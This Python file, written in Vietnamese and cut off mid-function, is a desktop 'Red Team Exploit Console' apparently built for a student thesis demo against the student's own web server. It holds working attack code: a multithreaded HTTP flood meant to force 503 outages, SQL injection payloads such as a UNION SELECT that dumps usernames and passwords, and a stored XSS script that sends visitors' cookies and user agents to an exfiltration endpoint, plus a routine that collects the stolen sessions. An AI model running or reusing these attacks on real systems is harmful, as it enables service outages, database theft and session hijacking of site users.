#!/usr/bin/env python3
"""
attacker_gui.py - Giao diện Desktop Đồ Họa Độc Lập Chuyên Nghiệp (Red Team Exploit Console)
Xây dựng trên nền tảng CustomTkinter / Tkinter Native Desktop.
Thiết kế phục vụ trình diễn và bảo vệ đồ án trước Hội đồng chấm thi:
1. Hỗ trợ nhập cả IP LAN (192.168.x.x:8080) và URL Ngrok công khai (https://xxxx.ngrok-free.app).
2. Tấn công DoS: Dội tải làm sập hoàn toàn Web Server, ép trả về lỗi 503 Service Unavailable
   khiến Hội đồng đang lướt web trên điện thoại/laptop bị gián đoạn ngay lập tức!
3. Tấn công SQL Injection: Trích xuất CSDL khách hàng. ĐẶC BIỆT: Lấy được ngay tài khoản
   mà Hội đồng vừa tạo trên web và highlight đỏ rực trên bảng kết quả!
4. Tấn công Stored XSS: Tiêm mã độc vào bảng tin phản hồi. Khi Hội đồng xem, script tự chạy
   trên trình duyệt của Hội đồng, bật popup cảnh báo và ngầm gửi Cookie phiên về Attacker GUI!
5. Nhận diện phản đòn từ HIPS: Phát hiện khi bị Firewall Drop hoặc Tarpit làm kẹt luồng.
"""
import sys
import time
import json
import threading
import urllib.request
import urllib.parse
import urllib.error
from pathlib import Path

# Thiết lập encoding UTF-8
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# Kiểm tra thư viện CustomTkinter, nếu chưa có sẽ dùng Tkinter fallback
try:
    import customtkinter as ctk
    USE_CUSTOMTKINTER = True
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")
except ImportError:
    USE_CUSTOMTKINTER = False
    import tkinter as tk
    from tkinter import ttk, messagebox, scrolledtext


class AttackerApp(ctk.CTk if USE_CUSTOMTKINTER else tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("⚡ RED TEAM EXPLOIT CONSOLE - CÔNG CỤ TẤN CÔNG & KIỂM CHỨNG HỘI ĐỒNG")
        self.geometry("1120x820")
        self.minsize(1020, 720)

        # Trạng thái điều khiển
        self.is_attacking = False
        self.stop_event = threading.Event()
        self.target_input = "http://127.0.0.1:8080"

        # Số liệu thống kê DoS
        self.dos_stats = {"sent": 0, "crashed_503": 0, "dropped": 0}
        self.stats_lock = threading.Lock()
        self._last_cookies_snapshot = None

        # Dựng giao diện
        self._build_header()
        self._build_target_config()
        self._build_attack_workspace()
        self._build_console_log()

        self.log_event("[HỆ THỐNG] Khởi tạo thành công Red Team Exploit Console.", "info")
        self.log_event(f"[MỤC TIÊU] Mặc định trỏ tới Web Server: {self.target_input}", "info")

        # Bật luồng tự động thăm dò Cookie cướp được từ XSS (chu kỳ 3 giây)
        self._start_xss_cookie_watcher()

    def _build_header(self):
        header_frame = ctk.CTkFrame(self, fg_color="#111827", corner_radius=8, height=65)
        header_frame.pack(fill="x", padx=14, pady=(12, 6))

        title_box = ctk.CTkFrame(header_frame, fg_color="transparent")
        title_box.pack(side="left", padx=18, pady=10)

        title_lbl = ctk.CTkLabel(
            title_box,
            text="⚡ RED TEAM EXPLOIT CONSOLE - MÁY TẤN CÔNG KIỂM CHỨNG",
            font=ctk.CTkFont(size=17, weight="bold"),
            text_color="#38bdf8"
        )
        title_lbl.pack(anchor="w")

        subtitle_lbl = ctk.CTkLabel(
            title_box,
            text="Kiểm thử xâm nhập 3 đòn: L4 DoS (503) | L7 SQLi (Trích xuất CSDL Hội đồng) | Stored XSS (Cướp Session)",
            font=ctk.CTkFont(size=11),
            text_color="#94a3b8"
        )
        subtitle_lbl.pack(anchor="w")

        self.badge_status = ctk.CTkLabel(
            header_frame,
            text="● SẴN SÀNG",
            font=ctk.CTkFont(size=12, weight="bold"),
            text_color="#10b981",
            fg_color="#064e3b",
            corner_radius=6,
            padx=14,
            pady=6
        )
        self.badge_status.pack(side="right", padx=16, pady=14)

    def _build_target_config(self):
        config_frame = ctk.CTkFrame(self, fg_color="#1e293b", corner_radius=8)
        config_frame.pack(fill="x", padx=14, pady=6)

        top_row = ctk.CTkFrame(config_frame, fg_color="transparent")
        top_row.pack(fill="x", padx=14, pady=10)

        lbl = ctk.CTkLabel(top_row, text="Địa chỉ Máy Chủ Mục Tiêu (IP/Ngrok):", font=ctk.CTkFont(weight="bold"))
        lbl.pack(side="left", padx=(0, 8))

        self.target_entry = ctk.CTkEntry(
            top_row, width=350, font=ctk.CTkFont(family="Consolas", size=13, weight="bold")
        )
        self.target_entry.insert(0, self.target_input)
        self.target_entry.pack(side="left", padx=(0, 12))

        ping_btn = ctk.CTkButton(
            top_row,
            text="🔍 Kiểm Tra Kết Nối (Ping)",
            fg_color="#0284c7",
            hover_color="#0369a1",
            command=self.check_connection
        )
        ping_btn.pack(side="left", padx=4)

        # Các nút gán nhanh địa chỉ
        preset_lbl = ctk.CTkLabel(top_row, text="Chọn Nhanh:", text_color="#94a3b8")
        preset_lbl.pack(side="left", padx=(18, 6))

        btn_local = ctk.CTkButton(
            top_row,
            text="Localhost (:8080)",
            width=120,
            fg_color="#334155",
            hover_color="#475569",
            command=lambda: self._set_target("http://127.0.0.1:8080")
        )
        btn_local.pack(side="left", padx=3)

        btn_lan = ctk.CTkButton(
            top_row,
            text="Wi-Fi / LAN IP",
            width=110,
            fg_color="#334155",
            hover_color="#475569",
            command=lambda: self._set_target("http://192.168.1.100:8080")
        )
        btn_lan.pack(side="left", padx=3)

    def _set_target(self, url_str):
        self.target_entry.delete(0, "end")
        self.target_entry.insert(0, url_str)
        self.log_event(f"[*] Đã chọn địa chỉ mục tiêu: {url_str}", "info")

    def get_base_url(self) -> str:
        raw = self.target_entry.get().strip() or "http://127.0.0.1:8080"
        if not raw.startswith("http://") and not raw.startswith("https://"):
            raw = f"http://{raw}"
        return raw.rstrip("/")

    def _build_attack_workspace(self):
        self.tabview = ctk.CTkTabview(self, fg_color="#1e293b", segmented_button_selected_color="#0284c7")
        self.tabview.pack(fill="both", expand=True, padx=14, pady=6)

        self.tab_dos = self.tabview.add("⚡ 1. Tấn Công DoS (Làm Sập Web 503)")
        self.tab_sqli = self.tabview.add("💉 2. SQL Injection (Trích Xuất CSDL Hội Đồng)")
        self.tab_xss = self.tabview.add("⚠️ 3. Stored XSS (Cướp Cookie Hội Đồng)")
        self.tab_all = self.tabview.add("🔥 4. Chiến Dịch Toàn Diện (3 Trong 1)")

        self._setup_dos_tab()
        self._setup_sqli_tab()
        self._setup_xss_tab()
        self._setup_all_tab()

    # ==========================================
    # PHÂN HỆ 1: TẤN CÔNG DoS (LÀM SẬP 503)
    # ==========================================
    def _setup_dos_tab(self):
        frame = self.tab_dos

        ctrl_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        ctrl_frame.pack(fill="x", padx=12, pady=(10, 8))

        # Slider số luồng
        threads_box = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        threads_box.pack(fill="x", padx=15, pady=8)

        self.threads_lbl = ctk.CTkLabel(threads_box, text="Số luồng dội tải đồng thời (Threads): 20 luồng", font=ctk.CTkFont(weight="bold"))
        self.threads_lbl.pack(side="left")

        self.threads_slider = ctk.CTkSlider(
            threads_box, from_=10, to=50, number_of_steps=40, width=260, command=self._update_threads_label
        )
        self.threads_slider.set(20)
        self.threads_slider.pack(side="right")

        # Slider thời gian
        dur_box = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        dur_box.pack(fill="x", padx=15, pady=8)

        self.dur_lbl = ctk.CTkLabel(dur_box, text="Thời gian dội tải: 12 giây", font=ctk.CTkFont(weight="bold"))
        self.dur_lbl.pack(side="left")

        self.dur_slider = ctk.CTkSlider(
            dur_box, from_=5, to=30, number_of_steps=25, width=260, command=self._update_dur_label
        )
        self.dur_slider.set(12)
        self.dur_slider.pack(side="right")

        # Nút bấm phát động & Dừng
        btn_row = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        btn_row.pack(fill="x", padx=15, pady=(8, 12))

        self.btn_start_dos = ctk.CTkButton(
            btn_row,
            text="🚀 PHÁT ĐỘNG TẤN CÔNG DoS (ÉP SẬP WEB 503)",
            font=ctk.CTkFont(weight="bold", size=13),
            fg_color="#dc2626",
            hover_color="#b91c1c",
            height=38,
            command=self.start_dos_attack
        )
        self.btn_start_dos.pack(side="left", expand=True, fill="x", padx=(0, 8))

        self.btn_stop_dos = ctk.CTkButton(
            btn_row,
            text="⏹ Dừng Dội Tải",
            font=ctk.CTkFont(weight="bold"),
            fg_color="#475569",
            hover_color="#334155",
            height=38,
            state="disabled",
            command=self.stop_attack
        )
        self.btn_stop_dos.pack(side="right", padx=(8, 0))

        # Thống kê và thanh tiến độ
        stats_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        stats_frame.pack(fill="both", expand=True, padx=12, pady=6)

        pb_row = ctk.CTkFrame(stats_frame, fg_color="transparent")
        pb_row.pack(fill="x", padx=15, pady=(12, 6))

        self.dos_pb = ctk.CTkProgressBar(pb_row, height=12)
        self.dos_pb.set(0)
        self.dos_pb.pack(fill="x")

        # 3 Thẻ số liệu KPI
        kpi_row = ctk.CTkFrame(stats_frame, fg_color="transparent")
        kpi_row.pack(fill="x", padx=15, pady=8)

        c1 = ctk.CTkFrame(kpi_row, fg_color="#1e293b", corner_radius=6)
        c1.pack(side="left", expand=True, fill="both", padx=4, pady=4)
        ctk.CTkLabel(c1, text="GÓI ĐÃ GỬI", font=ctk.CTkFont(size=11), text_color="#94a3b8").pack(pady=(6, 0))
        self.kpi_sent = ctk.CTkLabel(c1, text="0", font=ctk.CTkFont(size=22, weight="bold"), text_color="#38bdf8")
        self.kpi_sent.pack(pady=(0, 6))

        c2 = ctk.CTkFrame(kpi_row, fg_color="#1e293b", corner_radius=6)
        c2.pack(side="left", expand=True, fill="both", padx=4, pady=4)
        ctk.CTkLabel(c2, text="MÃ 503 SERVICE UNAVAILABLE", font=ctk.CTkFont(size=11), text_color="#94a3b8").pack(pady=(6, 0))
        self.kpi_503 = ctk.CTkLabel(c2, text="0", font=ctk.CTkFont(size=22, weight="bold"), text_color="#fbbf24")
        self.kpi_503.pack(pady=(0, 6))

        c3 = ctk.CTkFrame(kpi_row, fg_color="#1e293b", corner_radius=6)
        c3.pack(side="left", expand=True, fill="both", padx=4, pady=4)
        ctk.CTkLabel(c3, text="BỊ TƯỜNG LỬA HIPS DROP", font=ctk.CTkFont(size=11), text_color="#94a3b8").pack(pady=(6, 0))
        self.kpi_drop = ctk.CTkLabel(c3, text="0", font=ctk.CTkFont(size=22, weight="bold"), text_color="#f87171")
        self.kpi_drop.pack(pady=(0, 6))

        # Banner Kết Luận Phản Đòn
        self.dos_verdict_frame = ctk.CTkFrame(stats_frame, fg_color="#334155", corner_radius=6)
        self.dos_verdict_frame.pack(fill="x", padx=15, pady=(4, 12))

        self.dos_verdict_lbl = ctk.CTkLabel(
            self.dos_verdict_frame,
            text="Trạng thái: Nhấn nút bên trên để bắt đầu dội tải DoS làm sập hàng đợi máy chủ.",
            font=ctk.CTkFont(size=12),
            text_color="#e2e8f0"
        )
        self.dos_verdict_lbl.pack(padx=12, pady=10)

    def _update_threads_label(self, val):
        self.threads_lbl.configure(text=f"Số luồng dội tải đồng thời (Threads): {int(val)} luồng")

    def _update_dur_label(self, val):
        self.dur_lbl.configure(text=f"Thời gian dội tải: {int(val)} giây")

    # ==========================================
    # PHÂN HỆ 2: SQL INJECTION (TRÍCH XUẤT CSDL)
    # ==========================================
    def _setup_sqli_tab(self):
        frame = self.tab_sqli

        ctrl_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        ctrl_frame.pack(fill="x", padx=12, pady=(10, 8))

        p_row = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        p_row.pack(fill="x", padx=15, pady=(10, 6))

        ctk.CTkLabel(p_row, text="Mẫu Payload SQLi:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(0, 8))
        self.sqli_preset = ctk.CTkOptionMenu(
            p_row,
            values=[
                "' UNION SELECT id, username, password, full_name, role, balance FROM users --",
                "admin' OR '1'='1",
                "admin' --"
            ],
            width=420,
            command=self._apply_sqli_preset
        )
        self.sqli_preset.pack(side="left", padx=4)

        custom_row = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        custom_row.pack(fill="x", padx=15, pady=6)

        ctk.CTkLabel(custom_row, text="Payload Thực Thi:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(0, 8))
        self.sqli_entry = ctk.CTkEntry(custom_row, font=ctk.CTkFont(family="Consolas", size=13))
        self.sqli_entry.insert(0, "' UNION SELECT id, username, password, full_name, role, balance FROM users --")
        self.sqli_entry.pack(side="left", fill="x", expand=True, padx=4)

        self.btn_sqli = ctk.CTkButton(
            ctrl_frame,
            text="🚀 PHÁT ĐỘNG TẤN CÔNG SQLi & TRÍCH XUẤT CSDL (LẤY TÀI KHOẢN HỘI ĐỒNG)",
            font=ctk.CTkFont(weight="bold", size=13),
            fg_color="#d97706",
            hover_color="#b45309",
            height=38,
            command=self.start_sqli_attack
        )
        self.btn_sqli.pack(fill="x", padx=15, pady=(6, 12))

        # Bảng Dữ Liệu CSDL Khách Hàng Bị Rò Rỉ
        db_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        db_frame.pack(fill="both", expand=True, padx=12, pady=6)

        tbl_header = ctk.CTkFrame(db_frame, fg_color="#1e293b", height=32)
        tbl_header.pack(fill="x", padx=10, pady=(10, 4))

        ctk.CTkLabel(tbl_header, text="ID", width=40, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(tbl_header, text="HỌ VÀ TÊN KHÁCH HÀNG", width=200, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(tbl_header, text="TÀI KHOẢN", width=120, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(tbl_header, text="MẬT KHẨU BỊ LỘ", width=140, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(tbl_header, text="VAI TRÒ", width=120, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(tbl_header, text="SỐ DƯ", width=110, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(tbl_header, text="TRẠNG THÁI", font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", fill="x", expand=True, padx=4)

        self.sqli_scroll = ctk.CTkScrollableFrame(db_frame, fg_color="#090d16")
        self.sqli_scroll.pack(fill="both", expand=True, padx=10, pady=(0, 10))

        init_lbl = ctk.CTkLabel(
            self.sqli_scroll,
            text="Chưa có dữ liệu trích xuất. Khi Hội đồng tạo tài khoản xong, nhấn nút phát động SQLi bên trên để lấy dữ liệu!",
            text_color="#64748b",
            font=ctk.CTkFont(size=12)
        )
        init_lbl.pack(pady=25)

    def _apply_sqli_preset(self, val):
        self.sqli_entry.delete(0, "end")
        self.sqli_entry.insert(0, val)

    # ==========================================
    # PHÂN HỆ 3: STORED XSS & CƯỚP COOKIE
    # ==========================================
    def _setup_xss_tab(self):
        frame = self.tab_xss

        ctrl_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        ctrl_frame.pack(fill="x", padx=12, pady=(10, 8))

        row1 = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        row1.pack(fill="x", padx=15, pady=(10, 6))

        ctk.CTkLabel(row1, text="Tác giả (Author):", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(0, 8))
        self.xss_author = ctk.CTkEntry(row1, width=220)
        self.xss_author.insert(0, "RedTeam_Attacker")
        self.xss_author.pack(side="left", padx=4)

        row2 = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        row2.pack(fill="x", padx=15, pady=6)

        ctk.CTkLabel(row2, text="Mã độc Script XSS:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(0, 8))
        self.xss_entry = ctk.CTkEntry(row2, font=ctk.CTkFont(family="Consolas", size=12))
        # Payload Stored XSS sáng tạo: Vừa bật Popup trên máy Hội đồng, vừa ngầm gửi Cookie về máy Attacker!
        payload_xss = "<script>fetch('/api/xss/exfiltrate?cookie='+encodeURIComponent(document.cookie)+'&ua='+encodeURIComponent(navigator.userAgent)); setTimeout(()=>alert('⚠️ CẢNH BÁO AN NINH: Phát hiện kiểm thử XSS phiên trình duyệt! Token: '+document.cookie), 150);</script>"
        self.xss_entry.insert(0, payload_xss)
        self.xss_entry.pack(side="left", fill="x", expand=True, padx=4)

        btn_row = ctk.CTkFrame(ctrl_frame, fg_color="transparent")
        btn_row.pack(fill="x", padx=15, pady=(6, 12))

        self.btn_xss = ctk.CTkButton(
            btn_row,
            text="🚀 BƠM MÃ ĐỘC XSS VÀO BẢNG TIN PHẢN HỒI",
            font=ctk.CTkFont(weight="bold", size=13),
            fg_color="#8b5cf6",
            hover_color="#7c3aed",
            height=38,
            command=self.start_xss_attack
        )
        self.btn_xss.pack(side="left", expand=True, fill="x", padx=(0, 8))

        self.btn_pull_cookies = ctk.CTkButton(
            btn_row,
            text="🔄 Quét Cookie Cướp Được",
            font=ctk.CTkFont(weight="bold"),
            fg_color="#0284c7",
            hover_color="#0369a1",
            height=38,
            command=lambda: self.pull_stolen_cookies(force_refresh=True)
        )
        self.btn_pull_cookies.pack(side="right", padx=(8, 0))

        # Khung Danh Sách Cookie Phiên Bị Chiếm Đoạt Từ Hội Đồng
        res_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        res_frame.pack(fill="both", expand=True, padx=12, pady=6)

        ck_hdr = ctk.CTkFrame(res_frame, fg_color="#1e293b", height=32)
        ck_hdr.pack(fill="x", padx=10, pady=(10, 4))

        ctk.CTkLabel(ck_hdr, text="THỜI GIAN", width=90, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(ck_hdr, text="IP HỘI ĐỒNG (NẠN NHÂN)", width=150, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(ck_hdr, text="COOKIE / SESSION TOKEN BỊ ĐÁNH CẮP", width=280, font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", padx=4)
        ctk.CTkLabel(ck_hdr, text="THIẾT BỊ / TRÌNH DUYỆT (USER-AGENT)", font=ctk.CTkFont(weight="bold", size=11)).pack(side="left", fill="x", expand=True, padx=4)

        self.xss_cookie_scroll = ctk.CTkScrollableFrame(res_frame, fg_color="#090d16")
        self.xss_cookie_scroll.pack(fill="both", expand=True, padx=10, pady=(0, 10))

        init_ck = ctk.CTkLabel(
            self.xss_cookie_scroll,
            text="Chưa có Cookie nào bị bắt. Khi Hội đồng mở trang web xem bảng tin, mã XSS sẽ tự chạy và gửi Cookie về đây!",
            text_color="#64748b",
            font=ctk.CTkFont(size=12)
        )
        init_ck.pack(pady=25)

    # ==========================================
    # PHÂN HỆ 4: CHIẾN DỊCH TOÀN DIỆN (3 TRONG 1)
    # ==========================================
    def _setup_all_tab(self):
        frame = self.tab_all

        intro_frame = ctk.CTkFrame(frame, fg_color="#0f172a", corner_radius=6)
        intro_frame.pack(fill="x", padx=12, pady=(10, 8))

        ctk.CTkLabel(
            intro_frame,
            text="KỊCH BẢN TẤN CÔNG LIÊN HOÀN 3 ĐÒN:",
            font=ctk.CTkFont(weight="bold", size=13),
            text_color="#38bdf8"
        ).pack(anchor="w", padx=15, pady=(10, 4))

        steps_text = (
            "  1. Giai đoạn 1: Dội tải DoS trong 8 giây ➔ Làm cạn Worker Slots và sập máy chủ (503 Service Unavailable).\n"
            "  2. Giai đoạn 2: Phát động SQL Injection ➔ Trích xuất toàn bộ CSDL khách hàng (gồm tài khoản Hội đồng vừa tạo).\n"
            "  3. Giai đoạn 3: Tiêm mã độc Stored XSS ➔ Chạy mã JavaScript trên trình duyệt của Hội đồng và cướp Cookie phiên.\n"
            "  👉 Tự động kiểm tra và ghi nhận nếu Tường lửa HIPS của máy chủ đang hoạt động và phản đòn!"
        )
        ctk.CTkLabel(intro_frame, text=steps_text, justify="left", font=ctk.CTkFont(size=12), text_color="#cbd5e1").pack(anchor="w", padx=15, pady=(0, 10))

        self.btn_campaign = ctk.CTkButton(
            intro_frame,
            text="⚡ BẮT ĐẦU CHIẾN DỊCH TẤN CÔNG TOÀN DIỆN (3 ĐÒN LIÊN HOÀN)",
            font=ctk.CTkFont(weight="bold", size=14),
            fg_color="#e11d48",
            hover_color="#be123c",
            height=44,
            command=self.start_campaign_attack
        )
        self.btn_campaign.pack(fill="x", padx=15, pady=(4, 15))

    # ==========================================
    # KHUNG NHẬT KÝ CONSOLE PHÍA DƯỚI
    # ==========================================
    def _build_console_log(self):
        console_frame = ctk.CTkFrame(self, fg_color="#0f172a", corner_radius=8, height=180)
        console_frame.pack(fill="x", padx=14, pady=(6, 12))

        top_bar = ctk.CTkFrame(console_frame, fg_color="transparent")
        top_bar.pack(fill="x", padx=12, pady=(8, 4))

        lbl = ctk.CTkLabel(top_bar, text="📋 NHẬT KÝ HOẠT ĐỘNG THỜI GIAN THỰC (REAL-TIME LOG):", font=ctk.CTkFont(weight="bold", size=12))
        lbl.pack(side="left")

        btn_save = ctk.CTkButton(top_bar, text="Lưu Báo Cáo (.txt)", width=120, height=26, fg_color="#334155", hover_color="#475569", command=self.save_log_file)
        btn_save.pack(side="right", padx=4)

        btn_clear = ctk.CTkButton(top_bar, text="Xóa Màn Hình", width=100, height=26, fg_color="#334155", hover_color="#475569", command=self.clear_console)
        btn_clear.pack(side="right", padx=4)

        self.console_text = ctk.CTkTextbox(
            console_frame,
            font=ctk.CTkFont(family="Consolas", size=12),
            fg_color="#020617",
            text_color="#f8fafc",
            height=130
        )
        self.console_text.pack(fill="both", expand=True, padx=12, pady=(0, 10))

    def log_event(self, msg, level="info"):
        t_str = time.strftime("[%H:%M:%S]")
        formatted = f"{t_str} {msg}\n"

        def _append():
            self.console_text.insert("end", formatted)
            self.console_text.see("end")

        if threading.current_thread() is threading.main_thread():
            _append()
        else:
            self.after(0, _append)

    def clear_console(self):
        self.console_text.delete("1.0", "end")
        self.log_event("[HỆ THỐNG] Đã làm sạch toàn bộ nhật ký console.", "info")

    def save_log_file(self):
        content = self.console_text.get("1.0", "end")
        out_file = Path(__file__).resolve().parent / f"attack_report_{int(time.time())}.txt"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(content)
        self.log_event(f"[LƯU TRỮ] Đã xuất báo cáo tấn công ra file: {out_file.name}", "info")

    # ==========================================
    # LOGIC KIỂM TRA KẾT NỐI (PING)
    # ==========================================
    def check_connection(self):
        base_url = self.get_base_url()
        self.log_event(f"[*] Đang ping kiểm tra kết nối tới {base_url}/api/health...", "info")

        def _worker():
            try:
                url = f"{base_url}/api/health"
                req = urllib.request.Request(
                    url,
                    headers={"User-Agent": "Attacker-HealthCheck/3.0", "ngrok-skip-browser-warning": "true"}
                )
                t0 = time.time()
                with urllib.request.urlopen(req, timeout=2.5) as resp:
                    lat = round((time.time() - t0) * 1000, 1)
                    data = json.loads(resp.read().decode())
                    status = data.get("status")
                    self.log_event(f"[✓] Kết nối THÀNH CÔNG! Độ trễ: {lat}ms | Trạng thái: {status}", "info")
                    self.after(0, lambda l=lat: self.badge_status.configure(text=f"● ONLINE ({l}ms)", text_color="#10b981", fg_color="#064e3b"))
            except urllib.error.HTTPError as e:
                if e.code == 503:
                    self.log_event("[!] Máy chủ ĐANG BỊ SẬP (HTTP 503 Service Unavailable)! Toàn bộ worker đã cạn!", "warning")
                    self.after(0, lambda: self.badge_status.configure(text="● 503 CRASHED", text_color="#fbbf24", fg_color="#78350f"))
                else:
                    self.log_event(f"[-] HTTP Error: {e.code} (Kết nối bị từ chối bởi HIPS)", "danger")
                    self.after(0, lambda: self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#f87171", fg_color="#7f1d1d"))
            except Exception as e:
                self.log_event(f"[!] PHẢN ĐÒN TỪ MÁY CHỦ: Bị ngắt kết nối (Socket Dropped / Refused / Tarpitted: {e})", "danger")
                self.after(0, lambda: self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#f87171", fg_color="#7f1d1d"))

        threading.Thread(target=_worker, daemon=True).start()

    # ==========================================
    # THỰC THI TẤN CÔNG DoS (LÀM SẬP 503)
    # ==========================================
    def start_dos_attack(self):
        if self.is_attacking:
            return
        base_url = self.get_base_url()
        threads_count = int(self.threads_slider.get())
        duration_sec = int(self.dur_slider.get())

        self.is_attacking = True
        self.stop_event.clear()
        self.btn_start_dos.configure(state="disabled")
        self.btn_stop_dos.configure(state="normal")
        self.badge_status.configure(text="● ĐANG DỘI TẢI DoS", text_color="#fbbf24", fg_color="#78350f")

        self.dos_stats = {"sent": 0, "crashed_503": 0, "dropped": 0}
        self.kpi_sent.configure(text="0")
        self.kpi_503.configure(text="0")
        self.kpi_drop.configure(text="0")
        self.dos_pb.set(0)
        self.dos_verdict_lbl.configure(text="Đang dội tải DoS...")
        self.dos_verdict_frame.configure(fg_color="#334155")

        self.log_event(f"[+] Bắt đầu phát động DoS ({threads_count} luồng, {duration_sec}s) vào {base_url}/api/search", "warning")

        def _flood_worker(target_url):
            while not self.stop_event.is_set():
                try:
                    req = urllib.request.Request(target_url, headers={"User-Agent": "DoS-Attacker/3.0"})
                    with urllib.request.urlopen(req, timeout=1.5) as r:
                        with self.stats_lock:
                            self.dos_stats["sent"] += 1
                except urllib.error.HTTPError as e:
                    with self.stats_lock:
                        self.dos_stats["sent"] += 1
                        if e.code == 503:
                            self.dos_stats["crashed_503"] += 1
                except Exception:
                    with self.stats_lock:
                        self.dos_stats["sent"] += 1
                        self.dos_stats["dropped"] += 1
                time.sleep(0.04)

        def _manager():
            target_url = f"{base_url}/api/search?q=dos_flood_attack"
            threads = [threading.Thread(target=_flood_worker, args=(target_url,), daemon=True) for _ in range(threads_count)]
            for t in threads:
                t.start()

            start_t = time.time()
            for step in range(duration_sec):
                if self.stop_event.is_set():
                    break
                time.sleep(1.0)
                elapsed = time.time() - start_t
                progress = min(elapsed / duration_sec, 1.0)
                with self.stats_lock:
                    s = self.dos_stats["sent"]
                    c = self.dos_stats["crashed_503"]
                    d = self.dos_stats["dropped"]

                self.after(0, lambda p=progress, sv=s, cv=c, dv=d: (
                    self.dos_pb.set(p),
                    self.kpi_sent.configure(text=str(sv)),
                    self.kpi_503.configure(text=str(cv)),
                    self.kpi_drop.configure(text=str(dv)),
                ))

                if d > 20 and c < 5:
                    self.log_event("[!] Phát hiện Tường lửa HIPS máy chủ đã kích hoạt chặn gói tin! Dừng dội tải sớm.", "danger")
                    break

            self.stop_event.set()
            for t in threads:
                t.join(timeout=0.5)

            self.is_attacking = False
            with self.stats_lock:
                final_s = self.dos_stats["sent"]
                final_c = self.dos_stats["crashed_503"]
                final_d = self.dos_stats["dropped"]

            def _finish_dos_ui():
                self.btn_start_dos.configure(state="normal")
                self.btn_stop_dos.configure(state="disabled")
                if final_c >= 5:
                    msg = f"✓ MINH CHỨNG THÀNH CÔNG: Web Server đã bị sập hoàn toàn ({final_c} phản hồi HTTP 503)! Hội đồng vào web sẽ thấy trang 503!"
                    self.dos_verdict_lbl.configure(text=msg, text_color="#fef08a")
                    self.dos_verdict_frame.configure(fg_color="#854d0e")
                    self.badge_status.configure(text="● SẬP WEB (503)", text_color="#fef08a", fg_color="#854d0e")
                    self.log_event(f"[✓] {msg}", "info")
                elif final_d > 10:
                    msg = f"✗ PHẢN ĐÒN TỪ HIPS: Bạn đã bị khóa IP! Tường lửa Windows đã DROP toàn bộ {final_d} gói tin!"
                    self.dos_verdict_lbl.configure(text=msg, text_color="#fca5a5")
                    self.dos_verdict_frame.configure(fg_color="#991b1b")
                    self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#fca5a5", fg_color="#991b1b")
                    self.log_event(f"[-] {msg}", "danger")
                else:
                    msg = f"[*] Đã hoàn tất đợt DoS: Đã gửi {final_s} gói tin."
                    self.dos_verdict_lbl.configure(text=msg, text_color="#e2e8f0")
                    self.dos_verdict_frame.configure(fg_color="#334155")
                    self.badge_status.configure(text="● SẴN SÀNG", text_color="#10b981", fg_color="#064e3b")

            self.after(0, _finish_dos_ui)

        threading.Thread(target=_manager, daemon=True).start()

    def stop_attack(self):
        self.stop_event.set()
        self.log_event("[*] Đã yêu cầu dừng toàn bộ các luồng dội tải DoS.", "info")

    # ==========================================
    # THỰC THI SQL INJECTION (TRÍCH XUẤT CSDL HỘI ĐỒNG)
    # ==========================================
    def start_sqli_attack(self):
        base_url = self.get_base_url()
        raw_payload = self.sqli_entry.get().strip()
        encoded = urllib.parse.quote(raw_payload)
        url = f"{base_url}/api/login?user={encoded}&pass=any"

        self.log_event(f"[+] Đang phát động tấn công SQL Injection vào: {url}", "warning")

        def _render_sqli_records(records, is_honeypot):
            for widget in self.sqli_scroll.winfo_children():
                widget.destroy()

            if records:
                self.log_event(f"[✓] SQLi THÀNH CÔNG: Đã trích xuất {len(records)} tài khoản từ CSDL máy chủ!", "info")
                for u in records:
                    is_new = u.get("is_new", False)
                    row_color = "#450a0a" if is_new else ("#451a03" if is_honeypot else "#111827")
                    row = ctk.CTkFrame(self.sqli_scroll, fg_color=row_color, height=30)
                    row.pack(fill="x", pady=2)

                    ctk.CTkLabel(row, text=str(u.get("id")), width=40, text_color="#38bdf8").pack(side="left", padx=4)
                    ctk.CTkLabel(row, text=u.get("full_name", ""), width=200, text_color="#f8fafc", font=ctk.CTkFont(weight="bold" if is_new else "normal")).pack(side="left", padx=4)
                    ctk.CTkLabel(row, text=u.get("username", ""), width=120, text_color="#fbbf24", font=ctk.CTkFont(family="Consolas")).pack(side="left", padx=4)
